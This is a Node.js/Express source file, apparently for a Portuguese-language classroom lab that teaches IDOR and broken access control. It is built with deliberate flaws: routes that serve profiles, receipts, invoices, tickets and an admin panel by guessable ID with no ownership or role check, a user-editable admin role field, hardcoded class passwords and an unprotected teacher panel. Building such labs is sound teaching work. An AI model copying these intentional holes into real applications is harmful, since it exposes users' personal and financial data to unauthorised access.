        document.querySelectorAll('[id^="titulo-idor"]').forEach(function(titulo) {
            titulo.textContent = titulo.textContent.replace('✅ ', '');
        });
    }

    // Busca no servidor (tabela idor_progresso) quais exercícios já foram concluídos —
    // o navegador não guarda mais nada disso, então o estado é sempre o que está no banco.
    async function carregarProgressoDoServidorIdor(sala) {
        try {
            const response = await fetch('/idor/' + sala + '/progresso');
            const resultado = await response.json();
            desmarcarTodosIdor();
            (resultado.concluidos || []).forEach(marcarConcluidoIdor);
            atualizarContadorIdor((resultado.concluidos || []).length);
        } catch (err) {
            console.error('Erro ao carregar progresso:', err.message);
        }
    }

    async function validarTesteIdor(id) {
        const sala = window.SALA_ATUAL;
        const input = document.getElementById('resposta-' + id);
        const feedback = document.getElementById('feedback-' + id);
        const resposta = input.value;
        try {
            const response = await fetch('/idor/' + sala + '/validar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ testeId: id, resposta: resposta })
            });
            const resultado = await response.json();
            if (resultado.correto) {
                feedback.textContent = '✅ Correto! Exercício concluído.';
                feedback.style.color = '#28a745';
                await carregarProgressoDoServidorIdor(sala);
            } else {
                feedback.textContent = '❌ Ainda não é isso. Revise os passos do ataque e tente de novo.';
                feedback.style.color = '#dc3545';
            }
        } catch (err) {
            feedback.textContent = '❌ Erro ao validar: ' + err.message;
            feedback.style.color = '#dc3545';
        }
    }

    async function resetarIdor(sala) {
        if (!confirm('⚠️ Isso vai restaurar todos os dados do Lab ' + sala + ' de IDOR (perfis, comprovantes, faturas, pedidos, chamados e mensagens) E o progresso dos 10 exercícios para o estado original. Continuar?')) {
            return;
        }
        try {
            const response = await fetch('/idor/' + sala + '/reset', { method: 'POST' });
            const resultado = await response.json();
            alert(resultado.mensagem || resultado.erro);
            window.location.reload();
        } catch (err) {
            alert('❌ Erro ao resetar: ' + err.message);
        }
    }
`;

// Envolve o conteúdo de cada tela do lab de IDOR no mesmo layout simples (igual às telas de XSS)
function paginaIdor(sala, titulo, conteudoHtml) {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>${escapeHtml(titulo)} - Lab IDOR ${sala}</title>
        </head>
        <body style="font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 20px;">
            ${conteudoHtml}
            <br>
            <a href="/idor/${sala}" style="color:#fd7e14; text-decoration:none;">← Voltar para o Laboratório</a>
        </body>
        </html>
    `;
}

// Credenciais fixas de turma: cada sala física da aula usa um usuário (não é por aluno individual).
// "1"/"2" continuam sendo os identificadores internos usados nas rotas e nas tabelas idor_*.
const CREDENCIAIS_IDOR = {
    'sala-a': { senha: 'a-sala', sala: '1', nomeExibicao: 'Sala A' },
    'sala-b': { senha: 'sala-b', sala: '2', nomeExibicao: 'Sala B' }
};

// 0. LOGIN DA SALA — página estática, ver public/idor-login.html
//    (substitui a seleção livre de sala por usuário/senha por turma; o aviso de erro via
//    ?erro=1 agora é mostrado por um pequeno script no próprio HTML, no navegador)
app.get('/idor', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'idor-login.html'));
});

app.post('/idor/login', (req, res) => {
    const usuario = String(req.body.usuario || '').trim().toLowerCase();
    const senha = String(req.body.senha || '');
    const conta = CREDENCIAIS_IDOR[usuario];

    if (!conta || conta.senha !== senha) {
        return res.redirect('/idor?erro=1');
    }

    req.session.idorSala = conta.sala;
    req.session.idorNomeExibicao = conta.nomeExibicao;
    res.redirect(`/idor/${conta.sala}`);
});

app.get('/idor/logout', (req, res) => {
    req.session.idorSala = null;
    req.session.idorNomeExibicao = null;
    res.redirect('/idor');
});

// Protege o dashboard e tudo abaixo dele: só entra quem fez login como a sala correspondente
function exigirLoginIdor(req, res, next) {
    if (req.session.idorSala && req.session.idorSala === req.params.sala) {
        return next();
    }
    res.redirect('/idor');
}

// PAINEL OCULTO DO PROFESSOR — sem link em nenhum menu, só quem souber o endereço acessa.
// Precisa ser registrado ANTES de "/idor/:sala" abaixo, senão o Express trataria
// "painel-professor" como se fosse o valor de :sala e devolveria 404 antes de chegar aqui.
// Mostra, lado a lado, quais dos 10 exercícios cada sala já concluiu (dado salvo no servidor
// em idor_progresso, e não no localStorage do aluno).
app.get('/idor/painel-professor', async (req, res) => {
    try {
        const r = await pool.query('SELECT sala, teste_id, concluido_em FROM idor_progresso');
        const concluidos = {};
        r.rows.forEach(row => {
            concluidos[`${row.sala}:${row.teste_id}`] = row.concluido_em;
        });

        const linhas = testesIdor.map(teste => {
            const celulaSala = (salaId) => {
                const concluidoEm = concluidos[`${salaId}:${teste.id}`];
                if (concluidoEm) {
                    return `<td style="padding:10px; border:1px solid #ddd; text-align:center; background:#d4edda;">✅<br><small style="color:#666;">${new Date(concluidoEm).toLocaleString('pt-BR')}</small></td>`;
                }
                return '<td style="padding:10px; border:1px solid #ddd; text-align:center; background:#f8d7da; color:#721c24;">❌</td>';
            };
            return `
                <tr>
                    <td style="padding:10px; border:1px solid #ddd;">${escapeHtml(teste.nome)}</td>
                    ${celulaSala('1')}
                    ${celulaSala('2')}
                </tr>
            `;
        }).join('');

        const totalSalaA = Object.keys(concluidos).filter(k => k.startsWith('1:')).length;
        const totalSalaB = Object.keys(concluidos).filter(k => k.startsWith('2:')).length;

        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>Painel do Professor - Lab IDOR</title>
            </head>
            <body style="font-family: sans-serif; max-width: 900px; margin: 40px auto; padding: 20px;">
                <h2>🧑‍🏫 Painel do Professor — Progresso do Lab de IDOR</h2>
                <p style="color:#666;">Esta página não tem link em nenhum menu — só quem conhece o endereço acessa.</p>

                <div style="display:flex; gap:15px; margin-bottom:20px;">
                    <div style="flex:1; background:#fff3e6; border-left:4px solid #fd7e14; padding:15px; border-radius:4px;">
                        <strong>Sala A</strong> — ${totalSalaA} / 10 concluídos
                    </div>
                    <div style="flex:1; background:#fff3e6; border-left:4px solid #fd7e14; padding:15px; border-radius:4px;">
                        <strong>Sala B</strong> — ${totalSalaB} / 10 concluídos
                    </div>
                </div>

                <table style="width:100%; border-collapse:collapse;">
                    <thead>
                        <tr style="background:#f2f2f2;">
                            <th style="padding:10px; border:1px solid #ddd; text-align:left;">Exercício</th>
                            <th style="padding:10px; border:1px solid #ddd;">Sala A</th>
                            <th style="padding:10px; border:1px solid #ddd;">Sala B</th>
                        </tr>
                    </thead>
                    <tbody>${linhas}</tbody>
                </table>

                <div style="margin-top:25px; display:flex; gap:10px;">
                    <form action="/idor/painel-professor/limpar/1" method="POST" onsubmit="return confirm('Limpar todo o progresso registrado da Sala A?');">
                        <button type="submit" style="padding:10px 18px; background:#6c757d; color:white; border:none; border-radius:4px; cursor:pointer;">🧹 Limpar progresso da Sala A</button>
                    </form>
                    <form action="/idor/painel-professor/limpar/2" method="POST" onsubmit="return confirm('Limpar todo o progresso registrado da Sala B?');">
                        <button type="submit" style="padding:10px 18px; background:#6c757d; color:white; border:none; border-radius:4px; cursor:pointer;">🧹 Limpar progresso da Sala B</button>
                    </form>
                </div>
            </body>
            </html>
        `);
    } catch (error) {
        res.status(500).send(`<p style="color:red; font-family:sans-serif;">❌ Erro: ${escapeHtml(error.message)}</p>`);
    }
});

app.post('/idor/painel-professor/limpar/:sala', async (req, res) => {
    const { sala } = req.params;
    try {
        await pool.query('DELETE FROM idor_progresso WHERE sala=$1', [sala]);
        res.redirect('/idor/painel-professor');
    } catch (error) {
        res.status(500).send(`<p style="color:red; font-family:sans-serif;">❌ Erro: ${escapeHtml(error.message)}</p>`);
    }
});

// 1. DASHBOARD DO LAB DE IDOR (menu lateral com os 10 testes + atalhos para as telas "normais")
app.get('/idor/:sala', exigirLoginIdor, (req, res) => {
    const { sala } = req.params;
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Laboratório IDOR - Lab ${sala}</title>
            <style>${sidebarStyleIdor}</style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <h2>🔓 10 Testes de IDOR</h2>
                    <p id="contador-progresso" style="font-weight:bold; color:#fd7e14;">0 / 10 concluídos</p>
                    <p>Clique em um teste para ver o passo a passo do ataque e responder o desafio.</p>
                    ${renderMenuIdor(sala)}
                    <button class="reset-btn" onclick="resetarIdor('${sala}')">🔄 Resetar Dados do Lab ${sala}</button>
                    <a href="/idor/logout" class="nav-link">🚪 Sair (${escapeHtml(req.session.idorNomeExibicao || '')})</a>
                    <a href="/" class="nav-link">🏠 Voltar ao Hub</a>
                </div>

                <div class="main">
                    <div style="text-align: center; padding: 30px; background: linear-gradient(135deg, #fd7e14 0%, #c1590a 100%); color: white; border-radius: 8px; margin-bottom: 30px;">
                        <h1 style="margin: 0; font-size: 28px;">🔓 Laboratório de Práticas — Lab ${sala}</h1>
                        <p style="margin: 10px 0 0 0; font-size: 16px; opacity: 0.9;">IDOR e Quebra de Controle de Acesso - Aula Prática de Segurança</p>
                    </div>

                    <div style="background: #fff3e6; border-left: 4px solid #fd7e14; padding: 20px; margin-bottom: 30px; border-radius: 4px;">
                        <h3 style="color: #c1590a; margin-top: 0;">📚 Como Usar:</h3>
                        <ol style="color: #555; line-height: 1.8; margin: 10px 0;">
                            <li>Escolha um teste no menu lateral (👈 são 10 desafios diferentes) e leia "O que o aluno faz" e "Ação do ataque"</li>
                            <li>Siga os passos visitando as telas do laboratório, manipulando IDs, parâmetros e campos como instruído</li>
                            <li>Quando encontrar a informação pedida, cole a resposta no campo do próprio teste e clique em "Validar Resposta"</li>
                            <li>Se a resposta estiver certa, o teste é marcado com ✅ — seu progresso fica salvo neste navegador</li>
                            <li>Se algo der errado, os dados podem ser resetados a qualquer momento no botão mais abaixo no menu lateral (👇)</li>
                        </ol>
                    </div>

                    <div style="display: flex; gap: 15px; flex-wrap: wrap;">
                        <a href="/idor/${sala}/perfil/1" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #fd7e14; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">👤</div>
                            <h4 style="margin: 8px 0 4px 0; color: #fd7e14; font-size:14px;">Meu Perfil</h4>
                        </a>
                        <a href="/idor/${sala}/comprovante/1001" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #fd7e14; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">🧾</div>
                            <h4 style="margin: 8px 0 4px 0; color: #fd7e14; font-size:14px;">Meu Comprovante</h4>
                        </a>
                        <a href="/idor/${sala}/conta" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #fd7e14; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">⚙️</div>
                            <h4 style="margin: 8px 0 4px 0; color: #fd7e14; font-size:14px;">Minha Conta</h4>
                        </a>
                        <a href="/idor/${sala}/fatura/1006" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #fd7e14; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">🧾</div>
                            <h4 style="margin: 8px 0 4px 0; color: #fd7e14; font-size:14px;">Minha Fatura</h4>
                        </a>
                        <a href="/idor/${sala}/chamados" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #fd7e14; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">🎫</div>
                            <h4 style="margin: 8px 0 4px 0; color: #fd7e14; font-size:14px;">Meus Chamados</h4>
                        </a>
                        <a href="/idor/${sala}/pedidos" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #fd7e14; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">📦</div>
                            <h4 style="margin: 8px 0 4px 0; color: #fd7e14; font-size:14px;">Meus Pedidos</h4>
                        </a>
                        <a href="/idor/${sala}/mensagem/5001" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #fd7e14; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">✉️</div>
                            <h4 style="margin: 8px 0 4px 0; color: #fd7e14; font-size:14px;">Minhas Mensagens</h4>
                        </a>
                    </div>

                    <p style="margin-top:20px; color:#999; font-size:12px;">💡 O painel administrativo e a API de exemplo (Testes 4 e 6) não têm atalho aqui de propósito — parte do exercício é perceber que, mesmo sem nenhum link visível, essas rotas continuam acessíveis. Veja o passo a passo de cada teste no menu lateral.</p>
                </div>
            </div>
            <script>
                window.SALA_ATUAL = '${sala}';
                ${scriptAccordionIdor}
                carregarProgressoDoServidorIdor('${sala}');
            </script>
        </body>
        </html>
    `);
});

// 1.5 COMPROVANTE DE PAGAMENTO — ID sequencial e previsível, sem checagem de dono (Teste 1)
app.get('/idor/:sala/comprovante/:numero', async (req, res) => {
    const { sala } = req.params;
    const numero = parseInt(req.params.numero, 10);
    if (Number.isNaN(numero)) return res.status(400).send(paginaIdor(sala, 'Número inválido', '<h2>❌ Número de comprovante inválido</h2>'));

    try {
        const r = await pool.query('SELECT * FROM idor_comprovantes WHERE sala=$1 AND numero=$2', [sala, numero]);
        if (r.rows.length === 0) return res.status(404).send(paginaIdor(sala, 'Não encontrado', '<h2>❌ Comprovante não encontrado</h2>'));
        const c = r.rows[0];
        const html = `
            <h2>🧾 Comprovante de Pagamento #${c.numero} — Lab ${sala}</h2>
            <p style="color:#666;">A URL usa um número sequencial e previsível — sem nenhuma verificação de que este comprovante pertence a quem está "logado" (perfil 1).</p>
            <div style="background:#f8f9fa; border:1px solid #ddd; border-radius:4px; padding:20px;">
                <p><strong>Descrição:</strong> ${escapeHtml(c.descricao)}</p>
                <p><strong>Valor:</strong> R$ ${c.valor}</p>
            </div>
        `;
        res.send(paginaIdor(sala, 'Comprovante', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 2. PERFIL DE USUÁRIO — leitura (Teste 2) e formulário de edição — escrita (Teste 3)
app.get('/idor/:sala/perfil/:numero', async (req, res) => {
    const { sala } = req.params;
    const numero = parseInt(req.params.numero, 10);
    if (Number.isNaN(numero)) return res.status(400).send(paginaIdor(sala, 'Número inválido', '<h2>❌ Número de perfil inválido</h2>'));

    try {
        const r = await pool.query('SELECT * FROM idor_perfis WHERE sala=$1 AND numero=$2', [sala, numero]);
        if (r.rows.length === 0) return res.status(404).send(paginaIdor(sala, 'Não encontrado', '<h2>❌ Perfil não encontrado</h2>'));
        const p = r.rows[0];

        // Teste 3 (IDOR de escrita): se a bio de Marina (perfil 2) foi alterada para a frase
        // pedida no exercício, revela um código de confirmação — esse código é a resposta,
        // não a frase em si, então colar a frase de volta no campo de resposta não vale ponto.
        let blocoRevelado = '';
        if (numero === 2) {
            const fraseGatilho = normalizarRespostaIdor('Perfil comprometido via falha de IDOR');
            if (normalizarRespostaIdor(p.bio) === fraseGatilho) {
                blocoRevelado = `
                    <div style="background:#d4edda; border-left:4px solid #28a745; padding:15px; margin-top:15px; border-radius:4px;">
                        <strong>🔓 Alteração detectada! Código de confirmação da invasão:</strong> ${escapeHtml(RESPOSTAS_IDOR[sala].idor3)}
                    </div>
                `;
            }
        }

        const html = `
            <h2>👤 Perfil de Usuário — Lab ${sala}</h2>
            <p style="color:#666;">Exibindo todas as informações do perfil número <strong>${p.numero}</strong>, sem nenhuma verificação de que ele pertence a quem está "logado" (perfil 1).</p>
            <div style="background:#f8f9fa; border:1px solid #ddd; border-radius:4px; padding:20px;">
                <p><strong>Nome:</strong> ${escapeHtml(p.nome)}</p>
                <p><strong>E-mail:</strong> ${escapeHtml(p.email)}</p>
                <p><strong>Telefone:</strong> ${escapeHtml(p.telefone)}</p>
                <p><strong>Cargo:</strong> ${escapeHtml(p.cargo)}</p>
                <p><strong>Salário:</strong> R$ ${p.salario}</p>
                <p><strong>CPF:</strong> ${escapeHtml(p.cpf)}</p>
                <p><strong>Bio:</strong> ${escapeHtml(p.bio)}</p>
            </div>
            ${blocoRevelado}
            <p style="margin-top:15px;"><a href="/idor/${sala}/perfil/${p.numero}/editar" style="color:#fd7e14;">✏️ Editar este perfil</a></p>
        `;
        res.send(paginaIdor(sala, 'Perfil de ' + p.nome, html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

app.get('/idor/:sala/perfil/:numero/editar', async (req, res) => {
    const { sala } = req.params;
    const numero = parseInt(req.params.numero, 10);
    if (Number.isNaN(numero)) return res.status(400).send(paginaIdor(sala, 'Número inválido', '<h2>❌ Número de perfil inválido</h2>'));

    try {
        const r = await pool.query('SELECT * FROM idor_perfis WHERE sala=$1 AND numero=$2', [sala, numero]);
        if (r.rows.length === 0) return res.status(404).send(paginaIdor(sala, 'Não encontrado', '<h2>❌ Perfil não encontrado</h2>'));
        const p = r.rows[0];
        const html = `
            <h2>✏️ Editando Perfil #${p.numero} (${escapeHtml(p.nome)})</h2>
            <p style="color:#666;">Este formulário deveria editar <strong>apenas o seu próprio perfil</strong> (#1), mas o servidor nunca confere se o número na URL é realmente o seu.</p>
            <form action="/idor/${sala}/perfil/${p.numero}/editar" method="POST" style="background:#f8f9fa; border:1px solid #ddd; border-radius:4px; padding:20px;">
                <label style="font-weight:bold; display:block; margin-bottom:6px;">Bio:</label>
                <textarea name="bio" rows="3" style="width:100%; padding:10px; margin-bottom:14px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;">${escapeHtml(p.bio)}</textarea>
                <button type="submit" style="padding:12px 25px; background:#fd7e14; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Salvar Alterações</button>
            </form>
            <p style="margin-top:15px;"><a href="/idor/${sala}/perfil/${p.numero}" style="color:#fd7e14;">👁️ Ver perfil</a></p>
        `;
        res.send(paginaIdor(sala, 'Editar Perfil', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

app.post('/idor/:sala/perfil/:numero/editar', async (req, res) => {
    const { sala } = req.params;
    const numero = parseInt(req.params.numero, 10);
    const { bio } = req.body;
    if (Number.isNaN(numero)) return res.status(400).send(paginaIdor(sala, 'Número inválido', '<h2>❌ Número de perfil inválido</h2>'));

    try {
        await pool.query('UPDATE idor_perfis SET bio=$1 WHERE sala=$2 AND numero=$3', [bio, sala, numero]);
        res.redirect(`/idor/${sala}/perfil/${numero}`);
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 3. PAINEL ADMINISTRATIVO — acessível por qualquer um, sem checagem de papel (Teste 4)
app.get('/idor/:sala/admin/usuarios', async (req, res) => {
    const { sala } = req.params;
    try {
        const r = await pool.query('SELECT * FROM idor_perfis WHERE sala=$1 ORDER BY numero', [sala]);
        const linhas = r.rows.map(p => `
            <tr>
                <td style="padding:8px; border:1px solid #ddd;">${p.numero}</td>
                <td style="padding:8px; border:1px solid #ddd;">${escapeHtml(p.nome)}</td>
                <td style="padding:8px; border:1px solid #ddd;">${escapeHtml(p.cargo)}</td>
                <td style="padding:8px; border:1px solid #ddd;">R$ ${p.salario}</td>
                <td style="padding:8px; border:1px solid #ddd;">${escapeHtml(p.cpf)}</td>
            </tr>
        `).join('');
        const html = `
            <h2>🔐 Painel Administrativo — Lab ${sala}</h2>
            <p style="color:#666;">Esta página deveria existir apenas para administradores do sistema, mas não há nenhum link para ela em nenhum menu — e o servidor também nunca verifica se quem está acessando tem permissão. Basta conhecer (ou adivinhar) o endereço.</p>
            <table style="width:100%; border-collapse:collapse;">
                <thead>
                    <tr style="background:#f2f2f2;">
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">#</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">Nome</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">Cargo</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">Salário</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">CPF</th>
                    </tr>
                </thead>
                <tbody>${linhas}</tbody>
            </table>
        `;
        res.send(paginaIdor(sala, 'Painel Admin', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 4. MINHA CONTA — revela um segredo só se o papel do perfil 1 for "admin" (Teste 5, alvo)
app.get('/idor/:sala/conta', async (req, res) => {
    const { sala } = req.params;
    try {
        const r = await pool.query('SELECT * FROM idor_perfis WHERE sala=$1 AND numero=1', [sala]);
        const p = r.rows[0];
        const ehAdmin = p.papel === 'admin';
        const html = `
            <h2>👤 Minha Conta — Lab ${sala}</h2>
            <p><strong>Nome:</strong> ${escapeHtml(p.nome)}</p>
            <p><strong>Cargo atual:</strong> ${ehAdmin ? 'Administrador' : 'Aluno'}</p>
            <div style="background:${ehAdmin ? '#d4edda' : '#f8d7da'}; border-left:4px solid ${ehAdmin ? '#28a745' : '#dc3545'}; padding:15px; margin-top:15px; border-radius:4px;">
                ${ehAdmin
                    ? `<strong>🔓 Você desbloqueou o cofre dos administradores:</strong> ${escapeHtml(RESPOSTAS_IDOR[sala].idor5)}`
                    : '<strong>🔒 Conteúdo bloqueado:</strong> somente administradores podem ver isso.'}
            </div>
            <p style="margin-top:15px;"><a href="/idor/${sala}/conta/editar" style="color:#fd7e14;">✏️ Editar minha conta</a></p>
        `;
        res.send(paginaIdor(sala, 'Minha Conta', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 5. EDITAR MINHA CONTA — campo "Tipo de conta" visível e editável, mas o servidor aceita
//    o valor enviado sem checar se quem está pedindo tem permissão para virar admin (Teste 5)
app.get('/idor/:sala/conta/editar', async (req, res) => {
    const { sala } = req.params;
    try {
        const r = await pool.query('SELECT * FROM idor_perfis WHERE sala=$1 AND numero=1', [sala]);
        const p = r.rows[0];
        const html = `
            <h2>✏️ Editar Minha Conta — Lab ${sala}</h2>
            <p style="color:#666;">Formulário normal de edição de perfil — repare que ele deixa você escolher seu próprio "Tipo de conta".</p>
            <form action="/idor/${sala}/conta/editar" method="POST" style="background:#f8f9fa; border:1px solid #ddd; border-radius:4px; padding:20px;">
                <label style="font-weight:bold; display:block; margin-bottom:6px;">Nome:</label>
                <input type="text" name="nome" value="${escapeHtml(p.nome)}" style="width:100%; padding:10px; margin-bottom:14px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;">
                <label style="font-weight:bold; display:block; margin-bottom:6px;">Bio:</label>
                <textarea name="bio" rows="3" style="width:100%; padding:10px; margin-bottom:14px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;">${escapeHtml(p.bio)}</textarea>
                <label style="font-weight:bold; display:block; margin-bottom:6px;">Tipo de conta:</label>
                <select name="papel" style="width:100%; padding:10px; margin-bottom:14px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;">
                    <option value="aluno" ${p.papel === 'aluno' ? 'selected' : ''}>Aluno</option>
                    <option value="admin" ${p.papel === 'admin' ? 'selected' : ''}>Administrador</option>
                </select>
                <button type="submit" style="padding:12px 25px; background:#fd7e14; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Salvar Alterações</button>
            </form>
            <p style="margin-top:15px; color:#856404; font-size:13px;">💡 Em um sistema real, nenhum usuário comum deveria conseguir escolher o próprio nível de acesso assim.</p>
        `;
        res.send(paginaIdor(sala, 'Editar Conta', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

app.post('/idor/:sala/conta/editar', async (req, res) => {
    const { sala } = req.params;
    const { nome, bio, papel } = req.body;
    try {
        await pool.query('UPDATE idor_perfis SET nome=$1, bio=$2, papel=$3 WHERE sala=$4 AND numero=1', [nome, bio, papel || 'aluno', sala]);
        res.redirect(`/idor/${sala}/conta`);
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 6. API JSON — devolve dados de qualquer perfil sem checar quem está pedindo (Teste 6)
app.get('/idor/:sala/api/perfil/:numero', async (req, res) => {
    const { sala } = req.params;
    const numero = parseInt(req.params.numero, 10);
    if (Number.isNaN(numero)) return res.status(400).json({ erro: 'numero inválido' });

    try {
        const r = await pool.query('SELECT numero, nome, cargo, email, token FROM idor_perfis WHERE sala=$1 AND numero=$2', [sala, numero]);
        if (r.rows.length === 0) return res.status(404).json({ erro: 'perfil não encontrado' });
        res.json(r.rows[0]);
    } catch (error) {
        res.status(500).json({ erro: error.message });
    }
});

// 7. FATURA COM ID EM DÍGITOS INVERTIDOS — desfazer o disfarce é só ler o número ao contrário (Teste 7)
app.get('/idor/:sala/fatura/:codigo', async (req, res) => {
    const { sala, codigo } = req.params;
    const numero = parseInt(String(codigo).split('').reverse().join(''), 10);
    if (Number.isNaN(numero)) return res.status(400).send(paginaIdor(sala, 'Código inválido', '<h2>❌ Código de fatura inválido</h2>'));

    try {
        const r = await pool.query('SELECT * FROM idor_faturas WHERE sala=$1 AND numero=$2', [sala, numero]);
        if (r.rows.length === 0) return res.status(404).send(paginaIdor(sala, 'Não encontrada', '<h2>❌ Fatura não encontrada</h2>'));
        const f = r.rows[0];
        const html = `
            <h2>🧾 Fatura — Lab ${sala}</h2>
            <p style="color:#666;">O ID real (<strong>${f.numero}</strong>) está com os dígitos invertidos na URL, mas isso não é proteção — é só disfarce, fácil de desfazer de cabeça.</p>
            <div style="background:#f8f9fa; border:1px solid #ddd; border-radius:4px; padding:20px;">
                <p><strong>Descrição:</strong> ${escapeHtml(f.descricao)}</p>
                <p><strong>Valor:</strong> R$ ${f.valor}</p>
            </div>
        `;
        res.send(paginaIdor(sala, 'Fatura', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 8. CHAMADOS DE SUPORTE — listar, ler e excluir, todos sem checar o dono (Teste 8)
app.get('/idor/:sala/chamados', async (req, res) => {
    const { sala } = req.params;
    try {
        const r = await pool.query('SELECT numero, assunto FROM idor_chamados WHERE sala=$1 AND perfil_numero=1 ORDER BY numero', [sala]);
        const linhas = r.rows.map(c => `<li><a href="/idor/${sala}/chamado/${c.numero}" style="color:#fd7e14;">#${c.numero} - ${escapeHtml(c.assunto)}</a></li>`).join('');
        const html = `
            <h2>🎫 Meus Chamados de Suporte — Lab ${sala}</h2>
            <p style="color:#666;">Esta lista mostra só os SEUS chamados (perfil #1). Mas as páginas individuais de chamado, abaixo, não verificam de quem é o chamado.</p>
            <ul style="line-height:2;">${linhas || '<li>Nenhum chamado.</li>'}</ul>
        `;
        res.send(paginaIdor(sala, 'Meus Chamados', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

app.get('/idor/:sala/chamado/:numero', async (req, res) => {
    const { sala } = req.params;
    const numero = parseInt(req.params.numero, 10);
    if (Number.isNaN(numero)) return res.status(400).send(paginaIdor(sala, 'Número inválido', '<h2>❌ Número de chamado inválido</h2>'));

    try {
        const r = await pool.query('SELECT * FROM idor_chamados WHERE sala=$1 AND numero=$2', [sala, numero]);
        if (r.rows.length === 0) return res.status(404).send(paginaIdor(sala, 'Não encontrado', '<h2>❌ Chamado não encontrado (talvez já tenha sido excluído)</h2>'));
        const c = r.rows[0];
        const html = `
            <h2>🎫 Chamado #${c.numero} — Lab ${sala}</h2>
            <div style="background:#f8f9fa; border:1px solid #ddd; border-radius:4px; padding:20px;">
                <p><strong>Assunto:</strong> ${escapeHtml(c.assunto)}</p>
                <p><strong>Mensagem:</strong> ${escapeHtml(c.mensagem)}</p>
            </div>
            <form action="/idor/${sala}/chamado/${c.numero}/excluir" method="POST" style="margin-top:15px;" onsubmit="return confirm('Excluir este chamado, mesmo sem saber se é seu?');">
                <button type="submit" style="padding:10px 20px; background:#dc3545; color:white; border:none; border-radius:4px; cursor:pointer;">🗑️ Excluir Chamado</button>
            </form>
            <p style="margin-top:10px;"><a href="/idor/${sala}/chamados" style="color:#fd7e14;">← Ver meus chamados</a></p>
        `;
        res.send(paginaIdor(sala, 'Chamado', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

app.post('/idor/:sala/chamado/:numero/excluir', async (req, res) => {
    const { sala } = req.params;
    const numero = parseInt(req.params.numero, 10);
    if (Number.isNaN(numero)) return res.status(400).send(paginaIdor(sala, 'Número inválido', '<h2>❌ Número de chamado inválido</h2>'));

    try {
        await pool.query('DELETE FROM idor_chamados WHERE sala=$1 AND numero=$2', [sala, numero]);
        res.send(paginaIdor(sala, 'Excluído', '<h2>🗑️ Chamado excluído com sucesso.</h2><p style="color:#666;">Repare que isso funcionou mesmo sendo o chamado de outra pessoa.</p>'));
    } catch (error) {
